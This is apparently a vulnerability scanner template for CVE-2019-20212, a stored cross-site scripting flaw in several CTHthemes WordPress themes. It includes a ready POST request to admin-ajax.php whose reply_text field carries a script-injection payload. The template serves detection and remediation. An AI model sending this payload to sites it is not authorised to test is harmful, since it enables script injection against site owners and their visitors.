id: CVE-2019-20212

info:
  name: Persistent XSS in WordPress Themes via Chat Widget/Page Message Form
  author: ProjectDiscoveryAI
  severity: medium
  description: The CTHthemes CityBook before 2.3.4, TownHub before 1.0.6, and EasyBook before 1.2.2 themes for WordPress allow Persistent XSS via the chat widget/page message form.
  impact: |
    Allows attackers to execute malicious scripts on victim's browsers leading to data theft or unauthorized actions.
  remediation: |
    Update WordPress themes to the latest patched versions to mitigate the persistent XSS vulnerability.
  reference:
    - https://themeforest.net/item/citybook-directory-listing-wordpress-theme/21694727
    - https://themeforest.net/item/easybook-directory-listing-wordpress-theme/23206622
    - https://themeforest.net/item/townhub-directory-listing-wordpress-theme/25019571
    - https://wpvulndb.com/vulnerabilities/10013
    - https://wpvulndb.com/vulnerabilities/10014
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-20212
    cwe-id: CWE-79
    epss-score: 0.00496
    epss-percentile: 0.76961
    cpe: cpe:2.3:a:cththemes:citybook:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: cththemes
    product: citybook
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=citybook_addons_chat_reply&_nonce=x75ac6299d&cid=1020&user_id=XXX&touid=1&reply_text=<img src=x onerror=alert(`m0ze`)>

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "chat_reply"
        part: body
